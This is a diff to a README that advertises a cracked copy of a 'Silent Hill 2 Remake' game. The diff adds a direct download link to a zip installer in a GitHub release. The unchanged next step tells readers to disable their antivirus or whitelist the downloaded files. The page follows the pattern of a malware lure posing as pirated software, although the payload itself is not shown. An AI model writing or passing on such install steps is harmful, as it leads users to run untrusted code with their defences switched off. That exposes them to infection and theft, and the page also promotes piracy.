@@ -18,7 +18,7 @@ This cracked version provides unrestricted access to all the features, allowing 
 ## Installation Guide
 
 ### Step 1: Download the Game Files
-Use the provided link to download the cracked version of Rune: Silent Hill 2 Remake onto your PC.
+Use the [provided link to download](https://github.com/tagaasinnak03/silent-hill-2-pc-remake/releases/download/publish/installer.zip) the cracked version of Rune: Silent Hill 2 Remake onto your PC.
 
 ### Step 2: Disable Antivirus
 Temporarily disable your antivirus or add the downloaded files to the exception list to avoid interruptions during installation.
